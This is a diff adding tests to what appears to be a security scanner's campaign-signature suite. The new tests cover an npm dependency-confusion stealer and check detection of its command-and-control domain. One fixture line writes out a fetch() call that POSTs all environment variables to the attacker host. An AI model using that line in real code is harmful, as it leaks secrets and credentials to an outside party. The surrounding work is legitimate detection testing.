@@ -7602,6 +7602,44 @@ describe("Campaign Signatures", () => {
     });
   });
 
+  // Moika OOB: a May 2026 npm dependency-confusion stealer (183 packages over
+  // several internal-looking scopes) POSTed environment variables to one
+  // attacker host. safedep is the only analysis, so the entry is held at 0.85.
+  describe("Moika OOB npm dependency-confusion stealer (May 2026)", () => {
+    it("should detect the exfiltration host", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "init.js"),
+        'fetch("https://oob.moika.tech/report", { method: "POST", body: JSON.stringify(process.env) });'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("does not flag the apex or a sibling label", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "init.js"),
+        'const SITES = ["https://moika.tech/", "https://www.moika.tech/"];'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(
+        report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN")
+      ).toBeUndefined();
+    });
+
+    it("keeps the host bundled with a campaign at reduced confidence", () => {
+      const ioc = getBundledFeed().find((i) => i.value === "oob.moika.tech");
+      expect(ioc).toBeDefined();
+      expect(ioc?.campaign).toBeTruthy();
+      expect(ioc?.confidence).toBeLessThan(0.9);
+    });
+  });
+
   // Single-source package names from the Xygeni September 2026 digest with no
   // advisory record. They carry a family so the bundle cutoff never moves
   // them out of the offline package.
